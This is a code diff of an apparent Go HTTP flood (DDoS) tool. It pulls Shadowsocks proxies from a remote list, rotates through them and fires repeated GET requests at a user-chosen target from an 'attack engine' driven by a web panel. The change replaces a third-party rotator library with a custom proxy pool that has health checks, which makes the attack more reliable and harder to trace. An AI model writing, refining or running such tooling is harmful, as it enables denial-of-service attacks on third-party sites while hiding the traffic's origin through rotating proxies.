@@ -18,12 +18,11 @@ import (
     "sync/atomic"
     "time"
 
-    "github.com/greysquirr3l/lashes"
     ss "github.com/shadowsocks/go-shadowsocks2/core"
     "github.com/shadowsocks/go-shadowsocks2/socks"
 )
 
-// ========== CONFIGURATION ==========
+// ========== CONFIG ==========
 const (
     proxyListURL    = "https://raw.githubusercontent.com/render12345api/svr/main/ss_working.txt"
     maxProxies      = 8
@@ -32,9 +31,10 @@ const (
     refreshInterval = 15 * time.Minute
     maxErrorLog     = 20
     localSocksPort  = 1080
+    healthCheckURL  = "http://connectivitycheck.gstatic.com/generate_204"
 )
 
-// Supported encryption methods
+// Supported methods (from go-shadowsocks2)
 var supportedMethods = map[string]bool{
     "aes-128-cfb": true, "aes-192-cfb": true, "aes-256-cfb": true,
     "aes-128-ctr": true, "aes-192-ctr": true, "aes-256-ctr": true,
@@ -43,12 +43,20 @@ var supportedMethods = map[string]bool{
     "chacha20": true, "salsa20": true,
 }
 
-// ========== DATA STRUCTURES ==========
+// ========== STRUCTS ==========
 type ProxyConfig struct {
     Method   string
     Password string
     Server   string
     Port     string
+}
+
+type ProxyInstance struct {
+    Config   ProxyConfig
+    Client   *http.Client
+    URL      *url.URL
+    Healthy  bool
+    failures int
 }
 
 type AttackStats struct {
@@ -65,8 +73,10 @@ type ErrorEntry struct {
 
 // ========== GLOBAL STATE ==========
 var (
-    rotator        *lashes.Rotator
     proxyConfigs   []ProxyConfig
+    proxyPool      []*ProxyInstance
+    poolMutex      sync.RWMutex
+    currentIndex   uint64
     stats          AttackStats
     errorLog       []ErrorEntry
     errorLogMutex  sync.Mutex
@@ -77,7 +87,7 @@ var (
     webClientsLock sync.Mutex
 )
 
-// ========== PROXY PARSING ==========
+// ========== PROXY PARSING (same as before) ==========
 func decodeBase64Safe(s string) (string, error) {
     if l := len(s) % 4; l > 0 {
         s += strings.Repeat("=", 4-l)
@@ -239,9 +249,20 @@ func handleSOCKS5(client net.Conn, remoteAddr string, cipher ss.Cipher) {
     }
 }
 
-// ========== PROXY ROTATOR SETUP ==========
-func setupRotator(ctx context.Context, configs []ProxyConfig) (*lashes.Rotator, error) {
-    var proxyURLs []string
+// ========== SIMPLE PROXY POOL ==========
+func buildProxyPool(ctx context.Context, configs []ProxyConfig) error {
+    poolMutex.Lock()
+    defer poolMutex.Unlock()
+
+    // Stop old proxies
+    for _, p := range proxyPool {
+        if p.Client != nil {
+            p.Client.CloseIdleConnections()
+        }
+    }
+    proxyPool = nil
+
+    var instances []*ProxyInstance
     var closers []func()
 
     for i, cfg := range configs {
@@ -255,42 +276,81 @@ func setupRotator(ctx context.Context, configs []ProxyConfig) (*lashes.Rotator, 
             continue
         }
         closers = append(closers, closer)
-        proxyURLs = append(proxyURLs, fmt.Sprintf("socks5://127.0.0.1:%d", port))
+
+        proxyURL, _ := url.Parse(fmt.Sprintf("socks5://127.0.0.1:%d", port))
+        client := &http.Client{
+            Transport: &http.Transport{
+                Proxy: http.ProxyURL(proxyURL),
+            },
+            Timeout: 10 * time.Second,
+        }
+
+        instances = append(instances, &ProxyInstance{
+            Config:   cfg,
+            Client:   client,
+            URL:      proxyURL,
+            Healthy:  true,
+            failures: 0,
+        })
     }
 
-    if len(proxyURLs) == 0 {
-        return nil, fmt.Errorf("no proxies could be started")
-    }
-
+    // Start health checker
     go func() {
-        <-ctx.Done()
-        for _, closer := range closers {
-            closer()
+        ticker := time.NewTicker(30 * time.Second)
+        defer ticker.Stop()
+        for {
+            select {
+            case <-ctx.Done():
+                for _, closer := range closers {
+                    closer()
+                }
+                return
+            case <-ticker.C:
+                checkProxyHealth(ctx, instances)
+            }
         }
     }()
 
-    cfg := lashes.DefaultConfig()
-    cfg.Strategy = lashes.RoundRobinStrategy
-    cfg.HealthCheck = &lashes.HealthCheckConfig{
-        Interval: 30 * time.Second,
-        Timeout:  5 * time.Second,
-        Parallel: 3,
-    }
+    proxyPool = instances
+    log.Printf("Proxy pool built with %d instances", len(proxyPool))
+    return nil
+}
 
-    rot, err := lashes.New(cfg)
-    if err != nil {
-        return nil, err
-    }
-
-    for _, p := range proxyURLs {
-        if err := rot.Add(ctx, p, lashes.SOCKS5); err != nil {
-            log.Printf("Failed to add proxy %s: %v", p, err)
+func checkProxyHealth(ctx context.Context, instances []*ProxyInstance) {
+    for _, p := range instances {
+        if !p.Healthy {
+            // Already dead, maybe try to revive after a while
+            p.failures++
+            if p.failures > 3 {
+                // Mark for removal
+                p.Healthy = false
+            }
+            continue
         }
+        req, _ := http.NewRequestWithContext(ctx, "GET", healthCheckURL, nil)
+        resp, err := p.Client.Do(req)
+        if err != nil {
+            p.failures++
+            if p.failures > 2 {
+                p.Healthy = false
+                log.Printf("Proxy %s marked unhealthy: %v", p.URL, err)
+            }
+            continue
+        }
+        io.Copy(io.Discard, resp.Body)
+        resp.Body.Close()
+        p.failures = 0
     }
+}
 
-    go rot.HealthCheck(ctx, cfg.HealthCheck)
-
-    return rot, nil
+func getNextProxy() *ProxyInstance {
+    poolMutex.RLock()
+    defer poolMutex.RUnlock()
+    if len(proxyPool) == 0 {
+        return nil
+    }
+    idx := atomic.AddUint64(&currentIndex, 1) % uint64(len(proxyPool))
+    return proxyPool[idx]
 }
 
 // ========== ATTACK ENGINE ==========
@@ -328,23 +388,17 @@ func startAttack(target string, duration int) error {
                         if !attackActive {
                             return
                         }
-                        proxy, err := rotator.Next(ctx)
-                        if err != nil {
+                        proxy := getNextProxy()
+                        if proxy == nil || !proxy.Healthy {
                             atomic.AddUint64(&stats.Errors, 1)
-                            logError(target, err.Error(), "rotator")
+                            logError(target, "no healthy proxy", "")
                             return
                         }
-                        client := &http.Client{
-                            Transport: &http.Transport{
-                                Proxy: http.ProxyURL(proxy.URL()),
-                            },
-                            Timeout: 10 * time.Second,
-                        }
                         req, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
-                        resp, err := client.Do(req)
+                        resp, err := proxy.Client.Do(req)
                         if err != nil {
                             atomic.AddUint64(&stats.Errors, 1)
-                            logError(target, err.Error(), proxy.URL().String())
+                            logError(target, err.Error(), proxy.URL.String())
                             return
                         }
                         io.Copy(io.Discard, resp.Body)
@@ -427,9 +481,9 @@ func main() {
         log.Fatal("Failed to fetch proxies:", err)
     }
 
-    rotator, err = setupRotator(ctx, proxyConfigs)
+    err = buildProxyPool(ctx, proxyConfigs)
     if err != nil {
-        log.Fatal("Failed to setup rotator:", err)
+        log.Fatal("Failed to build proxy pool:", err)
     }
 
     go func() {
@@ -447,6 +501,7 @@ func main() {
                     continue
                 }
                 proxyConfigs = newConfigs
+                buildProxyPool(ctx, proxyConfigs) // rebuild pool
             }
         }
     }()
@@ -600,7 +655,7 @@ const htmlTemplate = `<!DOCTYPE html>
             </div>
 
             <div class="footer">
-                Using Go with lashes rotation engine – proxies refreshed every 15 min
+                Custom proxy pool – refreshed every 15 min
             </div>
         </div>
     </div>
